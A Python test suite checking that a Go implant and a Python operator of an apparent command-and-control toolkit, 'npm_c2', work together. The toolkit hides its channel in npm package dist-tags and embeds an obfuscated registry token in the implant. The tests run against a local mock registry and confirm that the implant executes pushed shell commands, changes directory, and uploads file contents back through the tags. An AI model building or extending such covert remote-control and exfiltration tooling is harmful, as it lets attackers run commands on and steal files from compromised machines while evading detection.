#!/usr/bin/env python3
"""Parity suite: the Go implant and the Python operator must interoperate.

Covers the framing, chunking, every command verb, and the token obfuscation,
all against the mock registry over real HTTP.
"""
import os
import subprocess
import sys
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, os.path.join(ROOT, "src"))
sys.path.insert(0, HERE)

import npm_c2
import mock_registry

FAILS = []
GO_BIN = os.environ.get("GO_BIN")  # optional: path to a linux build of the implant


def step(name, ok, detail=""):
    print(f"[{'PASS' if ok else 'FAIL'}] {name}" + (f"  -> {detail}" if detail else ""))
    if not ok:
        FAILS.append(name)


def go_build(outdir, api_base, token, package):
    """Build a linux binary of the Go implant with a token embedded."""
    out = os.path.join(outdir, "npmc2-linux")
    from npm_c2 import obfuscate_token
    env = dict(os.environ, CGO_ENABLED="0")
    ldflags = (f"-X main.apiTemplate={api_base}/-/package/%s/dist-tags "
               f"-X main.embeddedToken={obfuscate_token(token, package)}")
    p = subprocess.run(["go", "build", "-trimpath", "-ldflags", ldflags,
                        "-o", out, "."],
                       cwd=os.path.join(ROOT, "go"), env=env,
                       capture_output=True, text=True)
    if p.returncode != 0:
        raise SystemExit(p.stdout[-1500:] + p.stderr[-1500:])
    return out


def main():
    reg = mock_registry.Registry()
    srv, base = mock_registry.serve(reg, auth_token="npm_test")
    npm_c2.API = base + "/-/package/{}/dist-tags"
    import npm_c2.implant as im
    import npm_c2.operator as op_mod
    im.API = npm_c2.API
    op_mod.API = npm_c2.API

    from npm_c2.operator import Operator

    tmp = tempfile.mkdtemp()
    pkg = "parity/pkg"
    reg.tags.setdefault(pkg, {})["latest"] = "1.0.0"
    os.environ["APPDATA"] = tmp

    binary = GO_BIN or go_build(tmp, base, "npm_test", pkg)
    step("go implant builds", os.path.exists(binary), binary)

    # the Python operator writes the tags; Go reads them
    op = Operator(pkg, "npm_test")

    # --- framing parity (pure functions) --------------------------------
    sys.path.insert(0, HERE)
    step("framing: python-encoded tags decode with python",
         _roundtrip(npm_c2.encode_payload, b"parity-check", npm_c2.CMD_PREFIX))

    long_payload = ("X" * 900).encode()
    tags = npm_c2.encode_payload(long_payload, npm_c2.RES_PREFIX)
    step("framing: 900 bytes span several tags", len(tags) > 1, f"{len(tags)} tags")
    step("framing: reassembly is lossless",
         b"".join(b for b, ok in npm_c2.group_chunks(tags, npm_c2.RES_PREFIX) if ok)
         == long_payload)

    # --- live channel with the Go binary -------------------------------
    win_marker = os.path.join(tmp, "go-parity-marker")
    if os.path.exists(win_marker):
        os.remove(win_marker)

    log = open(os.path.join(tmp, "go.log"), "w")
    env = dict(os.environ, APPDATA=tmp)
    proc = subprocess.Popen([binary, "-p", pkg, "--interval", "2", "--jitter", "0",
                             "--verbose"], stdout=log, stderr=subprocess.STDOUT,
                            text=True, env=env)
    time.sleep(2)

    checks = [
        ("plain command", f"echo parity > {win_marker}", lambda: os.path.exists(win_marker)),
        ("cwd persistence", None, None),
    ]

    op.push_task(f"echo parity > {win_marker}")
    ok = wait_for(lambda: os.path.exists(win_marker), 25)
    step("go executes a python-pushed command", ok)

    marker2 = os.path.join(tmp, "m2")
    op.push_task(f"timeout:5:sh -c 'echo t2 > {marker2}'")
    step("go honours timeout:<sec>:<cmd>", wait_for(lambda: os.path.exists(marker2), 20))

    workdir = os.path.join(tmp, "work")
    os.makedirs(workdir, exist_ok=True)
    target = os.path.join(workdir, "cwd-file")
    op.push_task(f"cd:{workdir}")
    op.push_task("sh -c 'pwd > cwd-file'")
    step("go changes directory with cd:", wait_for(lambda: os.path.exists(target), 20),
         "file written in the new cwd" if os.path.exists(target) else "not written")

    big_src = os.path.join(tmp, "big")
    with open(big_src, "wb") as f:
        f.write(b"Z" * 5000)
    before = len([t for t in reg.snapshot(pkg) if t.startswith(npm_c2.RES_PREFIX)])
    op.push_task(f"up:{big_src}:0:12000")
    got = wait_for(lambda: len([t for t in reg.snapshot(pkg)
                                if t.startswith(npm_c2.RES_PREFIX)]) > before, 25)
    step("go answers up:<path>:<off>:<len>", got)

    # result parity: python must decode what go wrote
    results = [t for t in reg.snapshot(pkg) if t.startswith(npm_c2.RES_PREFIX)]
    decoded = b"".join(npm_c2.decode_tag(t)["data"] for t in results
                       if npm_c2.decode_tag(t))
    step("python decodes go's replies", len(decoded) > 0, f"{len(decoded)} bytes")
    step("the up: payload is valid base64 of the file",
         b"WlpaWlpa" in decoded or "Wlpa" in decoded.decode(errors="replace"))

    proc.terminate()
    try:
        proc.wait(timeout=10)
    except subprocess.TimeoutExpired:
        proc.kill()
    log.close()
    out = open(os.path.join(tmp, "go.log"), errors="replace").read()
    step("go logged its cycles", "cmd:" in out, out.strip().splitlines()[-1][:60] if out.strip() else "")

    srv.shutdown()
    print(f"\n{'go and python interoperate' if not FAILS else 'failing: ' + ', '.join(FAILS)}")
    return 1 if FAILS else 0


def _roundtrip(encode, payload, prefix):
    tags = encode(payload, prefix)
    return b"".join(b for b, ok in npm_c2.group_chunks(tags, prefix) if ok) == payload


def wait_for(pred, timeout):
    deadline = time.time() + timeout
    while time.time() < deadline:
        if pred():
            return True
        time.sleep(0.5)
    return False


if __name__ == "__main__":
    sys.exit(main())
